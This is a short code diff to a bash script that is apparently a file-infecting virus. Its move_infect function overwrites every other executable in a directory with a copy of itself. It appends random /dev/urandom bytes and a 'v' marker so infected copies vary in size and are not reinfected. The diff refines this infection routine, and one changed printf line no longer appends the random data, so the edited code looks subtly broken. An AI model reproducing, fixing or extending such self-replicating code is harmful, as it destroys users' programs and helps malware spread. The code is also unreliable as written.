@@ -13,14 +13,16 @@ function move_infect(){
 		# Infect executable file and avoid overwriting itself
 		if [ -f "$file" ] && [ -x "$file" ] && [ "$file" != "$0" ]
 		then
-			# Avoid infect already infected file 
-			if [ $(tail -c 1) != "v" ]
+			# Avoid infect already infected file
+			tmp=$(tail -c 1)
+			if [ "$tmp" != "v" ]
 			then
 				cp "$1" "$file"
 				# Avoid having the same size for each infected file
-				printf "%sv" $(head -c $(($RANDOM%10000)) /dev/urandom) >> "$file"
+				tmp=$(head -c $(($RANDOM%10000)) /dev/urandom)
+				printf "%sv"  >> "$file"
 			fi
 		fi
 	done
 }
-move_infect "$PWD/$0"
+move_infect "$PWD/${0##*/}"
